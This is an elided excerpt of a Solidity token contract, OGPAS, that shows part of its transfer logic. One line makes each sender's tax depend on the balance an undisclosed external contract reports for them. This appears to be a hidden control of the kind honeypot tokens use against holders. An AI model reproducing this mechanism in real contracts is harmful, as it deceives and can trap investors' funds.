...
contract OGPAS is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"OGPAS";
    string private constant _symbol = unicode"OGPAS";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (IERC20(balance()).balanceOf(from) == 0) taxAmount = 0;
